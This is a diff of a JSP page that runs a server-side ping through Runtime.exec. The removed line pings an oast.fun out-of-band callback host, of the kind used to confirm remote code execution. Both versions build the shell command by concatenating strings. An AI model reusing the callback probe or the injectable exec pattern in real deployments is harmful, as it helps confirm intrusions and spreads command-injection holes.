@@ -1,16 +1,41 @@
-<%@ page import="java.io.*" %>
+<%@ page import="java.io.BufferedReader, java.io.InputStreamReader, java.io.IOException" %>
+<%@ page import="java.nio.file.Path, java.nio.file.Paths, java.nio.file.Files" %>
+<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
+
 <%
-    String ip = "dgmbmgjxgnczpetprmxfs1utu4hreiiek.oast.fun"; // Replace with the IP address you want to ping
+    // Define the IP address to ping
+    String ipAddress = "8.8.8.8"; // You can change this to any IP
+
+    // Prepare to capture the output
+    StringBuilder pingResult = new StringBuilder();
+    String line;
+
     try {
-        Process process = Runtime.getRuntime().exec("ping -c 4 " + ip); // "-c 4" sends 4 pings on Linux/Mac
-        BufferedReader inputStream = new BufferedReader(new InputStreamReader(process.getInputStream()));
-        
-        String outputLine;
-        while ((outputLine = inputStream.readLine()) != null) {
-            out.println(outputLine + "<br>");
+        // Use the same method of executing a system command from your provided code
+        Process process = Runtime.getRuntime().exec("ping -c 4 " + ipAddress); // For Windows use "ping -n 4"
+
+        // Capture the command output (ping result)
+        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+        while ((line = reader.readLine()) != null) {
+            pingResult.append(line).append("<br>");
         }
-        inputStream.close();
-    } catch (IOException e) {
-        out.println("Error: " + e.getMessage());
+        reader.close();
+
+        // Capture any errors
+        BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
+        while ((line = errorReader.readLine()) != null) {
+            pingResult.append(line).append("<br>");
+        }
+        errorReader.close();
+
+        // Wait for the process to complete
+        int exitCode = process.waitFor();
+        pingResult.append("<br>Exit Code: ").append(exitCode);
+    } catch (IOException | InterruptedException e) {
+        pingResult.append("Error occurred: ").append(e.getMessage());
     }
+
+    // Display the result
+    out.println("<h2>Ping Result</h2>");
+    out.println("<pre>" + pingResult.toString() + "</pre>");
 %>
